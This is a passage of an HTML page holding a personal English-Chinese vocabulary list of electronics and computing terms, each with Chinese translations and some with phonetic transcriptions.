style="color:#fe2c24;">remarkable</span>非凡的;显著的;引人注目的</p>  <p><span style="color:#fe2c24;">partition </span>[pɑːrˈtɪʃ(ə)n]隔墙，隔板；（国家的）分裂，分治；（化学）分离层；（计算机）存储分区；（数学）分割</p>  <p>furthermore此外;而且;再者</p>  <p><span style="color:#fe2c24;">vice&nbsp;</span>恶习;邪恶;堕落</p>  <p><span style="color:#fe2c24;">versa </span>反之亦然</p>  <p><span style="color:#fe2c24;">vice versa</span>&nbsp;反之亦然</p>  <p>dependent source受控源</p>  <p>independent source独立源</p>  <p><span style="color:#fe2c24;">depict</span>描绘;描画;描写;描述;刻画</p>  <p><span style="color:#fe2c24;">procedure</span>程序;手续;步骤</p>  <p>ipod苹果公司音乐播放器</p>  <p><span style="color:#fe2c24;">classic </span>典型的，有代表性的；经典作品，杰作；杰出的事物，典范；传统活动，传统项目</p>  <p><span style="color:#fe2c24;">classical</span>古典的;经典的;传统的;</p>  <p><span style="color:#fe2c24;">quintessential&nbsp;</span>&nbsp;[ˌkwɪntɪˈsenʃl]典范的;典型的;本质的;精髓的</p>  <p>strike罢工;击;打;袭击;罢课;</p>  <p><span style="color:#fe2c24;">enclosure</span>圈占地;圈用地;围场;</p>  <p><span style="color:#fe2c24;">polish</span>磨光;润色;擦光;修改</p>  <p><span style="color:#fe2c24;">genius</span>天才，天资，天赋;</p>  <p>playlist播放列表</p>  <p>feature特色;特征;特点;</p>  <p>artwork艺术品</p>  <p><span style="color:#fe2c24;">navigate</span>导航;确定(船、飞机、汽车等)的位置和方向;航行;</p>  <p><span style="color:#fe2c24;">navigator</span>导航器</p>  <p><span style="color:#fe2c24;">genre</span>(文学、艺术、电影或音乐的）体裁，类型;</p>  <p><span style="color:#fe2c24;">shuffle&nbsp;</span>洗牌</p>  <p>podcast播客(一种类似于广播节目的音频文件，可下载到计算机或MP3播放器收听)</p>  <p><span style="color:#fe2c24;">seamless</span>无(接)缝的;(两部分之间)无空隙的</p>  <p>chip holder芯片底座</p>  <p>Fairchild仙童公司</p>  <p><span style="color:#fe2c24;">microprocessor</span>微处理器</p>  <p>co-processor协处理器;协同处理器</p>  <p><span style="color:#fe2c24;">cooperation&nbsp;</span>合作;协作;协助;配合</p>  <p>ultra &nbsp;[ˈʌltrə]极端的;(尤指政治上的)过激分子，极端主义者</p>  <p><span style="color:#fe2c24;">ultraviolet</span>紫外线;紫外光;紫外线辐射</p>  <p><span style="color:#fe2c24;">volume</span>体积;容积，容量;量</p>  <p><span style="color:#fe2c24;">moore's law摩尔定律</span></p>  <p><span style="color:#fe2c24;">predict预测;预言;预报;预告</span></p>  <p><span style="color:#fe2c24;">prediction预言;预测;预告</span></p>  <p>predictable可预测的;可预见的;可预料的;</p>  <p><span style="color:#fe2c24;">moderate</span>适度的;中等的;温和的;</p>  <p><span style="color:#fe2c24;">implement</span>使生效;贯彻;执行;实施</p>  <p>production生产;制造;制作;产量;</p>  <p>productivity生产率;生产效率;</p>  <p><span style="color:#fe2c24;">reasonable</span>公平的;合理的;有理由的;明智的;</p>  <p>automation自动化</p>  <p>automate ,v. 使自动化</p>  <p><span style="color:#fe2c24;">automatic&nbsp;</span>[ˌɔːtəˈmætɪk]自动的；自动换挡汽车；自动武器</p>  <p>necessity &nbsp;[nəˈsesəti]必然性;必要;必然;需要;必需品</p>  <p><span style="color:#fe2c24;">perform</span>表演;执行;履行;演出;做;工作，运转(好 / 不好)</p>  <p><span style="color:#fe2c24;">operate</span>工作;操作;控制;使运行;(被)使用;(使)运转;</p>  <p>trade off以…换取</p>  <p><span style="color:#fe2c24;">trade</span>贸易</p>  <p>trade-off权衡;(在需要而又相互对立的两者间的)协调</p>  <p>well informed见多识广的;消息灵通的;知识渊博的</p>  <p><span style="color:#fe2c24;">inform&nbsp;</span>通知，告知</p>  <p>etched 铭记在心的；脸上流露出的</p>  <p><span style="color:#fe2c24;">etch&nbsp;</span>蚀刻；鲜明地描述；铭记</p>  <p>Stripboard条状铜箔面包板</p>  <p>breadboard实验板;面包板</p>  <p><span style="color:#fe2c24;">anti clockwise逆时针;逆时钟方向的;逆时针方向旋转</span></p>  <p><span style="color:#fe2c24;">clockwise&nbsp;顺时针方向的</span></p>  <p><span style="color:#fe2c24;">notch&nbsp;</span>缺口;等级;档次;位阶;</p>  <p><span style="color:#fe2c24;">solder&nbsp;</span>&nbsp;[ˈsɑːdər]焊料;焊锡;焊接;焊合</p>  <p><span style="color:#fe2c24;">de-solder脱焊;去焊料</span></p>  <p><span style="color:#fe2c24;">heat sink散热器</span></p>  <p>sink&nbsp;下沉;下陷;(厨房里的)洗涤池，洗碗槽</p>  <p>circuit board电路板;线路板</p>  <p><span style="color:#fe2c24;">attempt</span>企图;试图;尝试;</p>  <p><span style="color:#fe2c24;">gently</span>轻轻地;温柔地;温和地;</p>  <p><span style="color:#fe2c24;">prized</span>珍贵的;宝贵的</p>  <p>prize&nbsp;奖品，奖项；非常珍贵的人（或物），十分重要的人（或物）;珍视，高度重视；</p>  <p>twist 使弯曲，扭弯；（使）扭曲变形；旋转，转动；扭动身体；</p>  <p>waist 腰，腰围；（衣服的）腰部，腰身；船腰，飞机机身中部</p>  <p>bend(使四肢等)弯曲;</p>  <p>reliably可靠地</p>  <p>reliable&nbsp;可靠的，可信赖的；真实可信的，确凿的；</p>  <p><span style="color:#fe2c24;">original</span>起初的;原来的;最早的;</p>  <p>originally原来;起初</p>  <p><span style="color:#fe2c24;">popularity</span>人气;普及;流行;受欢迎</p>  <p><span style="color:#fe2c24;">category&nbsp;</span>&nbsp;[ˈkætəɡɔːri]类别;(人或事物的)种类</p>  <p>functionality(计算机或电子系统的)功能</p>  <p><span style="color:#fe2c24;">specification</span>规格;规范;明细单;说明书</p>  <p>specify具体说明;明确规定;详述;详列</p>  <p><span style="color:#fe2c24;">specific</span>具体的;特定的;特有的;</p>  <p>ensure确保;保证;担保</p>  <p>minimal最小的;极小的，极少的</p>  <p><span style="color:#fe2c24;">objective</span>客观的;就事论事的;目的;目标;</p>  <p>power <span style="color:#fe2c24;">consumption</span>功率消耗</p>  <p>consumer消费者;顾客;用户</p>  <p>intend打算;计划;想要;意指</p>  <p><span style="color:#fe2c24;">permanent</span>永久的;永恒的;长久的</p>  <p><span style="color:#fe2c24;">preparation</span>准备;预备;准备工作;</p>  <p><span style="color:#fe2c24;">junior</span>年少者;青少年;职位较低者;</p>  <p><span style="color:#fe2c24;">hacksaw</span>钢锯</p>  <p><span style="color:#fe2c24;">stage</span>阶段;段;(发展或进展的)时期;状态;(多指剧场中的)舞台;戏剧;</p>  <p><span style="color:#fe2c24;">state&nbsp;</span>状态，状况；身体（或精神）状况；政府；国家；（联邦制共和国的）州，邦；陈述，说明；规定，公布；</p>  <p>restricted受限制的</p>  <p><span style="color:#fe2c24;">restrict</span>限制</p>  <p><span style="color:#fe2c24;">restriction</span>限制规定;限制法规;限制;约束;制约因素</p>  <p>certain 必然的，必定的；确定的，无疑的；某个，特定的；某位，一位</p>  <p>uncertainty 犹豫;迟疑;无把握;拿不定的事;</p>  <p><span style="color:#fe2c24;">topology</span>拓扑结构</p>  <p>uniform制服;校服;一致的;统一的;一律的</p>  <p>entail 使必要，需要；限定继承；使人承担</p>  <p><span style="color:#fe2c24;">penalty</span>处罚;刑罚;惩罚;</p>  <p><span style="color:#fe2c24;">optimization&nbsp;</span>最佳（优）化；优选法；</p>  <p><span style="color:#fe2c24;">optimize&nbsp;</span>优化;使最优化;充分利用</p>  <p>radiate&nbsp;使品质或情感）显出，流露；辐射，发射；</p>  <p><span style="color:#fe2c24;">radiation&nbsp;</span>&nbsp;[ˌreɪdiˈeɪʃ(ə)n]辐射（n）</p>  <p><span style="color:#fe2c24;">radial&nbsp;</span>放射状的;辐射状的</p>  <p><span style="color:#fe2c24;">radical</span>根本的;彻底的;</p>  <p><span style="color:#fe2c24;">deployment</span>部署</p>  <p><span style="color:#fe2c24;">subscriber&nbsp;</span>&nbsp;[səbˈskraɪbər](报刊的)订阅人，订购者</p>  <p><span style="color:#fe2c24;">subscription&nbsp;</span>&nbsp;[səbˈskrɪpʃ(ə)n]（杂志等的）订阅费，（服务的）用户费；订阅，订购；</p>  <p><span style="color:#fe2c24;">upgrade</span>升级，提升，提高，改善;（计算机的）升级设备，升级软件</p>  <p><span style="color:#fe2c24;">two-dimensional code</span>二维码</p>  <p><span style="color:#fe2c24;">handset</span>手机&nbsp;;&nbsp;电话听筒&nbsp;;&nbsp;遥控器</p>  <p><span style="color:#fe2c24;">multimedia</span>多媒体</p>  <p><span style="color:#fe2c24;">venture</span>(尤指有风险的)企业，商业，投机活动，经营项目</p>  <p><span style="color:#fe2c24;">tentatively </span>暂时地；试验性地</p>  <p>platform站台;月台;讲台;</p>  <p><span style="color:#fe2c24;">previously&nbsp;</span>以前地，先前地</p>  <p><span style="color:#fe2c24;">previous&nbsp;</span>以前的，先前的；</p>  <p><span style="color:#fe2c24;">infrastructure&nbsp;</span>(国家或机构的)基础设施，基础建设</p>  <p>ticket票;券;车票;戏票;入场券;奖券;彩票;</p>  <p><span style="color:#fe2c24;">ionosphere&nbsp;</span>电离层</p>  <p>grama rays 格拉玛射线</p>  <p>visible light可见光</p>  <p><span style="color:#fe2c24;">atmosphere&nbsp;</span>气氛;(围绕地球的)大气，大气层，大气圈;</p>  <p><span style="color:#fe2c24;">fortunate&nbsp;</span>幸运的;交好运的;吉利的</p>  <p><span style="color:#fe2c24;">curvature</span>弯曲;曲度;曲率</p>  <p><span style="color:#fe2c24;">curve&nbsp;</span>曲线，弧线;曲面;弯曲;</p>  <p>experiment实验;试验;尝试;</p>  <p>experimentation实验;试验;尝试</p>  <p>bounce(使)弹起，弹跳;反射;</p>  <p>bound&nbsp;必然的，肯定的；受约束的，有义务的；被……所限制的，被……所束缚的</p>  <p><span style="color:#fe2c24;">substance</span>物质;物品;东西;事实基础;</p>  <p>bear熊;承受;忍受;</p>  <p><span style="color:#fe2c24;">remain</span>留下，逗留，停留;保持不变;剩余物，残余（物）</p>  <p>remainder余数;其他人员;剩余物;剩余时间;</p>  <p><span style="color:#fe2c24;">remind</span>提醒;使想起</p>  <p><span style="color:#fe2c24;">portable</span>便携式的;手提的;轻便的</p>  <p>slim苗条的;纤细的;单薄的</p>  <p><span style="color:#fe2c24;">gorgeous</span>非常漂亮的;华丽的;绚丽的;</p>  <p>intuitive &nbsp;[ɪnˈtuːɪtɪv]凭直觉得到的;直觉的;</p>  <p><span style="color:#fe2c24;">tricky</span>棘手的;狡猾的;难办的;</p>  <p>touchscreen触摸屏</p>  <p><span style="color:#fe2c24;">cinch</span>很容易的事;小菜</p>  <p><span style="color:#fe2c24;">fingertip</span>指尖</p>  <p><span style="color:#fe2c24;">fuel</span>燃料;</p>  <p><span style="color:#fe2c24;">upcome</span>迎头赶上</p>  <p>binary二进制;二进制的</p>  <p>octal八进制</p>  <p>decimal十进制的;小数;小数的</p>  <p>hexadecimal十六进制的</p>  <p>adapt适应(新情况);改编;</p>  <p>primary初级的;主要的;最重要的;</p>  <p>formal正式的;适合正式场合的;正规的;</p>  <p>A equal 1&nbsp; &nbsp;A等于1</p>  <p>frequently频繁地;经常</p>  <p><span style="color:#fe2c24;">advantageous&nbsp;</span>&nbsp;[ˌædvənˈteɪdʒəs]有利的;有好处的</p>  <p><span style="color:#fe2c24;">advantage&nbsp;&nbsp;</span>&nbsp;[ədˈvæntɪdʒ]有利条件，优势；优点；利益；有利于，有助于</p>  <p>substitute(以…)代替，代用;接替;代用品，代替者;代替者</p>  <p>indicator指示信号;标志;迹象;指示器;指针;转向灯;方向灯</p>  <p><span style="color:#fe2c24;">versatility</span>多才多艺;技术全面；用途广泛</p>  <p>sort分类;排序;整理</p>  <p>activate使活动;激活;使活化</p>  <p>circuitry电路系统;电路;电路装置</p>  <p><span style="color:#fe2c24;">immunity</span>免疫;免疫力;豁免;受保护;免除</p>  <p><span style="color:#fe2c24;">immune&nbsp;</span>免疫的；不受影响的；免除的，豁免的</p>  <p>store商店;存储</p>  <p>broadest最广泛的</p>  <p>broadcast广播;播送(电视或无线电节目);散布，传播(信息等);</p>  <p>broadband 宽频；宽波段</p>  <p><span style="color:#fe2c24;">inhibit&nbsp;</span>抑制，约束；使拘束，使尴尬；降低（酶等）的活性；</p>  <p>arrange安排;筹备;整理;</p>  <p>arrangement安排;筹备;安排方式;</p>  <p>chain链子;链条;锁链;</p>  <p>decade十年;十年期</p>  <p>beware当心;小心;提防</p>  <p><span style="color:#fe2c24;">glitch</span>差错;小故障;小毛病</p>  <p>pure纯净的;纯粹的;纯的;干净的;</p>  <p>purely纯粹地仅仅;完全</p>  <p><span style="color:#fe2c24;">ingredient</span>（食品的）成分，原料；要素，因素</p>  <p>memory记忆力;记性;存储器</p>  <p>pointer指针</p>  <p><span style="color:#fe2c24;">reside&nbsp;</span>&lt;正式&gt;居住，定居；&lt;正式&gt;存在于；</p>  <p>general全体的;普遍的;总的;正常的;将军;</p>  <p>generally通常地;通常;普遍地;</p>  <p>motherboard母板;主板</p>  <p><span style="color:#fe2c24;">expansion slot</span>扩展槽;扩充槽;扩充插槽;</p>  <p>slot狭槽;(投放或插入东西的)窄缝，扁口;</p>  <p>chipset芯片组</p>  <p>glue胶;胶水;(用胶水)粘合，粘牢</p>  <p><span style="color:#fe2c24;">dual</span>二重的;双重的;双的;两部分的</p>  <p>dual-trace双迹式示波器</p>  <p><span style="color:#fe2c24;">retrace</span>回溯;折回;追溯;回顾;</p>  <p>trace查出;找到;发现;追踪;追溯;追究;</p>  <p><span style="color:#fe2c24;">track</span>轨道;(人踩出的)小道，小径;追踪;(尤指用特殊电子设备)跟踪;</p>  <p><span style="color:#fe2c24;">miniature</span>很小的;微型的;小型的</p>  <p><span style="color:#fe2c24;">antenna</span>天线;触角;触须</p>  <p>antennae(复数)天线;触角;触须</p>  <p><span style="color:#fe2c24;">interference &nbsp;</span>[ˌɪntərˈfɪrəns](无线电信号的)干扰;干涉;干预;介入</p>  <p>interfere&nbsp;干涉，干扰；阻碍，妨害；</p>  <p>elsewhere在别处，去别处</p>  <p><span style="color:#fe2c24;">confine</span>限制;限定;监禁;禁闭;使离不开(或受困于床、轮椅等);范围;界限;边界;限度</p>  <p>confined to受限制的;限制;限定;</p>  <p><span style="color:#fe2c24;">confirm</span>(尤指提供证据来)证实，证明;</p>  <p><span style="color:#fe2c24;">robust</span>强健的;强劲的;强壮的;</p>  <p>indeed的确;强调肯定的陈述或答复;</p>  <p><span style="color:#fe2c24;">differentiate &nbsp;</span>[ˌdɪfəˈrenʃieɪt]使不同；求……的微分；区别</p>  <p>unique唯一的;独一无二的;独特的;</p>  <p>corresponding符合的;相应的;相一致;符合;通信</p>  <p><span style="color:#fe2c24;">interrupt</span>打断;打扰;使中断;阻断</p>  <p>interruption中断;打扰;阻断物;中断时间;插嘴;打岔</p>  <p><span style="color:#fe2c24;">interpret</span>解释;诠释;口译;说明;</p>  <p><span style="color:#fe2c24;">intercept</span>拦截;拦阻;截住;（线，面）截取，截断（部分面积、线、面）</p>  <p>execute实行;执行;实施;</p>  <p><span style="color:#fe2c24;">routine</span>常规;正常顺序;常规的;例行公事的;日常的;</p>  <p><span style="color:#fe2c24;">subroutine</span>子例程，子程序</p>  <p>boot 靴子；猛踢；启动(计算机);(计算机)启动</p>  <p><span style="color:#fe2c24;">supplement&nbsp;</span>补充;增补;补充物，增补物；</p>  <p><span style="color:#fe2c24;">handler</span>处理程序</p>  <p><span style="color:#fe2c24;">floppy&nbsp;</span>松软的;松松垮垮的;下垂的</p>  <p>shadow阴影;影子;昏暗处;背光处;</p>  <p>embedded嵌入（或插入、埋入）……之中的;</p>  <p>effectively有效地;</p>  <p>generation一代;(统称)一代人;同辈人;代;</p>  <p>organism有机体;生物;(尤指)微生物;有机组织;有机体系</p>  <p>gene基因</p>  <p>biochip生物芯片；生物集成电路片</p>  <p>outline&nbsp;轮廓，外形；轮廓图，草图；提纲，大纲；梗概，要点；（词的）速记形式 v. 概述，略述；勾勒，描画……的轮廓</p>  <p><span style="color:#fe2c24;">mathematical</span>数学的;</p>  <p><span style="color:#fe2c24;">drawback</span>缺点;不利条件</p>  <p>assistance帮助;援助;支持</p> </blockquote> <blockquote>  <p>involvement参与;加入;插手;投入;沉迷;</p>  <p>microchip微芯片;植微芯片于</p>  <p><span style="color:#fe2c24;">gate</span>大门，栅栏门</p>  <p><span style="color:#fe2c24;">gateway</span>大门口;门道;出入口;网关</p>  <p>workable可行的;行得通的;</p>  <p><span style="color:#fe2c24;">harsh&nbsp;</span>（环境）恶劣的，艰苦的；严厉的，残酷的；刺耳的，难听的；刺眼的，耀眼的；</p>  <p><span style="color:#fe2c24;">rack</span>支架;架子;</p>  <p><span style="color:#fe2c24;">rock</span>岩石;石山;礁石;摇滚乐;</p>  <p><span style="color:#fe2c24;">isolated</span>偏远的;孤零零的;孤独的;孤立的;</p>  <p>preferably更可取地;最好;宁可</p>  <p><span style="color:#fe2c24;">brick</span>砖;砖块;积木;</p>  <p>make sense 有意义；讲得通；言之有理</p>  <p>expand扩大;</p>  <p>database数据库</p> </blockquote> <blockquote>  <p><span style="color:#fe2c24;">assembly language汇编语言</span></p>  <p><span style="color:#fe2c24;">assembly&nbsp;</span>议会，代表大会；集会，集会者；装配，组装；（计算机）汇编</p>  <p>structured language结构化语言</p>  <p>similarity相似性;相像性;相仿性;</p>  <p>strictly严格地;</p>  <p>academic学术的(与实践性、技术性相对);学业的;</p>  <p>informally非正式地；不拘礼节地</p>  <p><span style="color:#fe2c24;">inform&nbsp;</span>通知，告知；告发，检举（inform on）</p>  <p><span style="color:#fe2c24;">informal&nbsp;</span>轻松友好的，不拘礼节的；（文字或言谈）非正式的，口语体的；（服装）休闲的，家居的；（组织、团体和安排）非官方的，非正规的</p>  <p>compartmentalization [kəmˌpɑːrtˌmentələˈzeɪʃn]区域划分</p>  <p>section部分;部门;部件;散件;区</p>  <p><span style="color:#fe2c24;">creep</span>爬行，匍匐;悄悄地缓慢行进;</p>  <p><span style="color:#fe2c24;">discrete</span>离散的;分离的;互不相连的;</p>  <p><span style="color:#fe2c24;">declare</span>声明;宣布;宣告;宣称;</p>  <p>block of code代码块</p>  <p>curly brace花括号;花括弧;大括号;</p>  <p>readable可读性强的;通俗易懂的;</p>  <p><span style="color:#fe2c24;">impose</span>强制实行;推行，采用(规章制度);迫使;把…强加于;</p>  <p>demand需要;所需之物;</p>  <p><span style="color:#fe2c24;">notation</span>符号;(数学、科学和音乐中的)记号;谱号</p>  <p><span style="color:#fe2c24;">annotate</span>注释;给…作注解(或评注)</p>  <p><span style="color:#fe2c24;">matrix</span>矩阵;</p>  <p><span style="color:#fe2c24;">vector</span>矢量;向量;</p>  <p>plotting process绘图过程</p>  <p><span style="color:#fe2c24;">reveal</span>揭示;显示;透露;显出;露出;展示</p>  <p>range from……to……范围从……到……</p>  <p>opcode指令;操纵码;运算码;操作码</p>  <p>operand操作数;运算数</p>  <p><span style="color:#fe2c24;">subtract</span>减;减去</p>  <p><span style="color:#fe2c24;">mnemonic &nbsp;</span>[nɪˈmɑːnɪk]记忆的，记忆术的</p>  <p><span style="color:#fe2c24;">accumulate</span>积累;积聚;</p>  <p><span style="color:#fe2c24;">accumulator</span>累加器;蓄电池;</p>  <p><span style="color:#fe2c24;">miscellaneous&nbsp;</span>&nbsp;[ˌmɪsəˈleɪniəs]混杂的;各种各样的</p>  <p><span style="color:#fe2c24;">laptop&nbsp;</span>笔记本电脑;便携式电脑</p>  <p><span style="color:#fe2c24;">scrap&nbsp;</span>碎片，小块(纸、织物等)，零屑;废弃，抛弃;拆毁</p>  <p><span style="color:#fe2c24;">junk</span>废旧物品;无用的东西;无价值的东西;</p>  <p><span style="color:#fe2c24;">flexible</span>灵活的;</p>  <p><span style="color:#fe2c24;">mainframe</span>主机;主计算机</p>  <p>dialer拨号;拨号器;</p>  <p>dial&nbsp;拨号</p>  <p>bandwidth带宽;频宽;带宽值，</p>  <p><span style="color:#fe2c24;">vendor</span>小贩;摊贩;(某种产品的)销售公司;(房屋等的)卖主</p>  <p><span style="color:#fe2c24;">accommodate</span>容纳;为(某人)提供住宿(或膳宿、座位等);为…提供空间</p>  <p>accommodation&nbsp;&lt;美&gt;住宿，膳宿；&lt;英&gt;住处，办公处，停留处；</p>  <p><span style="color:#fe2c24;">peripheral&nbsp;</span>&nbsp;[pəˈrɪfərəl]外围设备;周边设备;外设</p>  <p><span style="color:#fe2c24;">claim&nbsp;</span>宣称;声称;声明;断言;</p>  <p><span style="color:#fe2c24;">expertise&nbsp;</span>专业知识;专长;</p>  <p><span style="color:#fe2c24;">certify&nbsp;</span>证明;(尤指书面)证实;颁发(或授予)专业合格证书;</p>  <p><span style="color:#fe2c24;">certification&nbsp;</span>证明，资质证书；出具课程结业证书</p>  <p><span style="color:#fe2c24;">attain&nbsp;</span>得到;(通常经过努力)获得;</p>  <p><span style="color:#fe2c24;">candidate&nbsp;</span>候选人;(竞选或求职的)申请人;参加考试的人;</p>  <p>object-oriented 面向对象的</p>  <p><span style="color:#fe2c24;">orient&nbsp;</span>朝向;面对;确定方向;</p>  <p>gap 缺口;差距;间隙;间隔;</p>  <p><span style="color:#fe2c24;">abstraction&nbsp;</span>抽象概念;抽象;</p>  <p>attraction吸引力</p>  <p>user-defined&nbsp; 自定义</p>  <p><span style="color:#fe2c24;">inheritance&nbsp;</span>继承物(如金钱、财产等);遗产继承;</p>  <p><span style="color:#fe2c24;">inherit&nbsp;</span>继承</p>  <p><span style="color:#fe2c24;">stepwise&nbsp;</span>逐步的;逐渐的;</p>  <p>wise明智的;充满智慧的;</p>  <p>refinement精炼;提炼;(精细的)改进</p>  <p><span style="color:#fe2c24;">refine&nbsp;</span>精炼，提纯；改进，改善；使……文雅</p>  <p>reuse重新使用，再使用;多次利用，重复利用</p>  <p><span style="color:#fe2c24;">rescue</span>营救;援救;抢救</p>  <p>off-the-shelf现成的;</p>  <p>retrain再训练，再锻炼;再培训</p>  <p><span style="color:#fe2c24;">substantial</span>大量的;价值巨大的;</p>  <p><span style="color:#fe2c24;">influential</span>有很大影响（力）的;</p>  <p>meaningful有意义的;重要的;重大的;意味深长的;</p>  <p><span style="color:#fe2c24;">pixel</span>像素(组成屏幕图像的最小独立元素)</p>  <p>scene场景;场面;情景;镜头;景象</p>  <p><span style="color:#fe2c24;">filament</span>(电灯泡的)灯丝;丝极;细丝;</p>  <p>glow&nbsp;发出微弱而稳定的光；（脸部或身体）发红，发热；喜形于色，容光焕发；发出艳丽色彩</p>  <p><span style="color:#fe2c24;">intensity&nbsp;</span>强烈;紧张;剧烈;强度;烈度</p>  <p><span style="color:#fe2c24;">cassette&nbsp;</span>&nbsp;[kəˈset]盒式录音带;</p>  <p><span style="color:#fe2c24;">magnify&nbsp;</span>放大;扩大;增强;</p>  <p>magnifying glass放大镜</p>  <p>stripe &nbsp;[straɪp]条纹;线条;（军装上表示等级的）臂章，军阶条；</p>  <p>strip&nbsp;除去，撕掉（外皮或表层）；夺去，剥夺（地位，权力，财产）；脱衣服，脱光……的衣服；（纸、金属、织物等）条，带；带状地带；</p>  <p><span style="color:#fe2c24;">perforate</span>打孔，穿孔，打眼;</p>  <p><span style="color:#fe2c24;">align&nbsp;</span>公开支持，与……结盟；（使）排成一条直线，使平行；</p>  <p><span style="color:#fe2c24;">chrominance&nbsp;</span>[光] 色度；色差；彩色信号</p>  <p><span style="color:#fe2c24;">decode</span>破译，译解（密码信息）;解码</p>  <p>pick选择;挑选;采;摘;</p>  <p><span style="color:#fe2c24;">tape</span>磁带;录音带;录像带;胶带;</p>  <p>tap&nbsp;轻拍，轻扣，轻敲；敲出节奏，打拍子；水龙头，阀门</p>  <p>gap&nbsp;缝隙，缺口；（时间上的）间隔；</p>  <p><span style="color:#fe2c24;">via</span>经过，经由（某一地方）;通过，凭借（某人、系统等）</p>  <p>theft盗窃;偷窃;盗窃罪</p>  <p>thief&nbsp;&nbsp;贼，小偷，偷窃犯</p>  <p>steal&nbsp;偷窃，盗窃；剽窃，窃取（观点）</p>  <p><span style="color:#fe2c24;">clarity </span>清晰易懂；思路清晰；（画面或声音的）清晰，清楚；清澈，明净</p>  <p><span style="color:#fe2c24;">clarify&nbsp;</span>澄清，阐明；（通过加热）使净化，使纯净</p>  <p><span style="color:#fe2c24;">classify&nbsp;</span>把……分类，把……分级；把（信息）归入保密级别</p>  <p>solidity&nbsp;坚固，坚硬；稳固，可靠（性）</p>  <p><span style="color:#fe2c24;">pale</span>灰白的;苍白的;白皙的;浅色的;微弱的</p>  <p><span style="color:#fe2c24;">plain&nbsp;</span>无装饰的，朴素的；单色的，无花纹的；单纯的，不掺杂的；</p>  <p><span style="color:#fe2c24;">scheme</span>计划，规划，方案;方案;体系</p>  <p>underway进行中的;（船、火车等）在行进中的</p>  <p><span style="color:#fe2c24;">reception </span>接待;招待会;接待处;</p>  <p><span style="color:#fe2c24;">stunning </span>惊人的;令人震惊的;</p>  <p><span style="color:#fe2c24;">draw</span>画;(用铅笔、钢笔或粉笔)描绘;描画;拖(动);拉(动);</p>  <p><span style="color:#fe2c24;">nematic</span>向列型（的）（液晶）</p>  <p>column柱;(通常为)圆形石柱;纪念柱;圆柱状物;(报刊的）专栏，栏目;纵行（数字或字）;长列，纵队</p>  <p><span style="color:#fe2c24;">intersect </span>相交;交叉;横穿;</p>  <p><span style="color:#fe2c24;">plasma </span>血浆;等离子体;原浆</p>  <p>videotape录像带;录像磁带</p>  <p><span style="color:#fe2c24;">incredible</span>不能相信的;难以置信的;</p>  <p><span style="color:#fe2c24;">incredibly</span>难以置信地;令人难以置信;</p>  <p><span style="color:#fe2c24;">astounding&nbsp;</span>[əˈstaʊndɪŋ]令人震惊的;使大吃一惊的</p>  <p><span style="color:#fe2c24;">credit</span>信用;学分;</p>  <p><span style="color:#fe2c24;">detect</span>发现;查明;侦察出</p>  <p>detector探测器;侦察器;检测器</p>  <p><span style="color:#fe2c24;">recreate 娱乐；消遣；</span>再现;再创造</p>  <p>film-like presentation电影式演示</p>  <p><span style="color:#fe2c24;">full-specification</span>全规格</p>  <p><span style="color:#fe2c24;">breadth</span>宽度;(知识、兴趣等的)广泛</p>  <p>breath，n&nbsp;呼吸，气息；一次吸入的空气；</p>  <p><span style="color:#fe2c24;">panel&nbsp;</span>面板;(门、墙等上面的)嵌板，镶板，方格板块;</p>  <p>viewfinder(照相机的)取景器</p>  <p>lens透镜;镜片;(眼球的)晶状体</p>  <p><span style="color:#fe2c24;">spool&nbsp;</span>卷轴，线轴；缠绕，卷在线轴上；</p>  <p><span style="color:#fe2c24;">optic&nbsp;</span>视觉的;眼睛的；（光学仪器的）镜头，光学部件；</p>  <p><span style="color:#fe2c24;">optical&nbsp;</span>视力的，视觉的;光的，光学的;</p>  <p><span style="color:#fe2c24;">determinant</span>决定因素;决定条件</p>  <p><span style="color:#fe2c24;">megapixel</span>兆像素;百万像素</p>  <p><span style="color:#fe2c24;">boast</span>自夸;自吹自擂;夸耀;夸口</p>  <p>coast&nbsp;海岸，海滨；</p>  <p><span style="color:#fe2c24;">boost&nbsp;</span>促进;使增长;使兴旺;提高;帮助;激励;增长;(发动机或电器设备的)功率增大;</p>  <p><span style="color:#fe2c24;">burst&nbsp;</span>爆发;(使)爆裂，胀开;猛冲;</p>  <p><span style="color:#fe2c24;">interpolation&nbsp;</span>插入；篡改；填写；插值</p>  <p><span style="color:#fe2c24;">interpolate&nbsp;</span>篡改;插入（字句等）;插话，插嘴;〈数〉插（值）</p>  <p>bitmap位图</p>  <p><span style="color:#fe2c24;">lossy</span>(对数据或电能)有损的，有损耗的</p>  <p><span style="color:#fe2c24;">lossless</span>(数据或电能)无损的，无损耗的</p>  <p>preview预览;预演;预展;预映;概述;扼要介绍</p>  <p>thumbnail&nbsp;拇指指甲；极小的东西；短文</p>  <p><span style="color:#fe2c24;">focal&nbsp;</span>[ˈfoʊk(ə)l]焦点的，在焦点上的；</p>  <p>focus&nbsp;重点，中心点；关注，注意；震源；目的，意图；焦距；集中，关注；聚焦，调焦；</p>  <p><span style="color:#fe2c24;">arguably</span>(常用于形容词比较级或最高级前)可论证地</p>  <p><span style="color:#fe2c24;">gimmick&nbsp;</span>&nbsp;[ˈɡɪmɪk]花招;(为引人注意或诱人购买而搞的)把戏</p>  <p>trick&nbsp;花招，诡计，骗局；窍门，技巧；戏法，把戏；恶作剧，戏弄；欺骗，哄骗；</p>  <p><span style="color:#fe2c24;">exposure&nbsp;</span>暴露，接触；曝光，揭发；报道，宣传；单张胶片；曝光时间，曝光量；</p>  <p><span style="color:#fe2c24;">shutter</span>百叶窗;活动护窗;(照相机的)快门</p>  <p><span style="color:#fe2c24;">monochrome</span>单色;单色画;单色照片;黑白照片;单色的;黑白的</p>  <p><span style="color:#fe2c24;">sepia</span>乌贼墨颜料(或墨汁);深褐色</p>  <p><span style="color:#fe2c24;">sharpness&nbsp;</span>锐利；[摄] 清晰度；</p>  <p><span style="color:#fe2c24;">built-in</span>嵌入式的;内置的</p>  <p><span style="color:#fe2c24;">override&nbsp;</span>否决，推翻，不理会;比…更重要，凌驾;</p>  <p>overwrite&nbsp;重写；重叠写在……上面；（计算机）盖写，覆盖</p>  <p><span style="color:#fe2c24;">connectivity&nbsp;</span>连通（性），联结（度）</p>  <p><span style="color:#fe2c24;">rival&nbsp;</span>竞争对手;与…相匹敌;比得上</p>  <p>battle战争;战斗;战役;</p>  <p><span style="color:#fe2c24;">arena&nbsp;</span>竞技场;圆形运动场;</p>  <p><span style="color:#fe2c24;">volatile&nbsp;</span>&nbsp;[ˈvɑːlət(ə)l]不稳定的;易挥发的，易发散的;易变的，无定性的，无常性的;</p>  <p><span 